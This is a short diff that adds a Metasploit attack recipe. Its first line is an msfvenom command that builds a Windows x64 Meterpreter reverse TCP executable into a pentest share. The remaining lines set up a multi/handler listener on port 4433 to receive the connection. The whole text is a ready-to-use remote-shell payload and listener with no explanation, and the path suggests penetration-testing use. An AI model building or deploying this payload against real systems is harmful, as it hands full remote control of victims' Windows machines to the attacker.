@@ -1,0 +1,6 @@
+msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=4433 -f exe > /pentest/share/shell.exe
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LPORT 4433
+set LHOST 0.0.0.0
+exploit -j
